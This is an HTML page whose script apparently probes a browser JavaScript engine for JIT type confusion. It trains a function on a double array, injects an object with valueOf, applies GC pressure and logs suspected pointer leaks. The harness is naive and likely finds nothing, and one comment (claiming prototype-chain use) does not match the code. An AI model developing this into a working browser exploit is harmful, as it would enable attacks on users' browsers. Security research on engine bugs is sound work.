<!doctype html>
<meta charset="utf-8">
<pre id="log"></pre>

<script>

const log = m => {
  document.getElementById("log").textContent += m + "\n"
  console.log(m)
}

// =======================
// TARGET
// =======================

function vuln(a){
  return a[0] + 1.1   // expect double
}

function trigger(a){
  return vuln(a)
}

// =======================
// TRAIN
// =======================

function train(){
  let a = [1.1, 2.2, 3.3, 4.4]

  for(let i=0;i<100000;i++){
    trigger(a)
  }

  return a
}

// =======================
// CONFUSION
// =======================

function corrupt(a){

  // ⚠ subtle: jangan langsung replace index 0
  // ubah lewat prototype chain

  let fake = { valueOf(){
    return 13.37
  }}

  // inject object tapi tetap “numeric-ish”
  a[0] = fake

  return a
}

// =======================
// CHECK
// =======================

function check(v){

  if(typeof v !== "number"){
    log("🔥 TYPE CONFUSION: " + v)
    return true
  }

  if(!Number.isFinite(v)){
    log("🔥 NaN/INF: " + v)
    return true
  }

  if(Math.abs(v) > 1e12){
    log("🔥 PTR LEAK?: " + v)
    return true
  }

  return false
}

// =======================
// MAIN
// =======================

function run(){

  log("[*] training...")
  let base = train()

  log("[*] triggering...")

  for(let i=0;i<20000;i++){

    let arr = corrupt([...base])

    let r = trigger(arr)

    if(check(r)){
      return
    }

    // GC pressure ringan
    if(i % 50 === 0){
      for(let k=0;k<10;k++)
        new ArrayBuffer(0x10000)
    }

    if(i % 2000 === 0)
      log("iter " + i)
  }

  log("[*] no bug (still safe path)")
}

run()

</script>
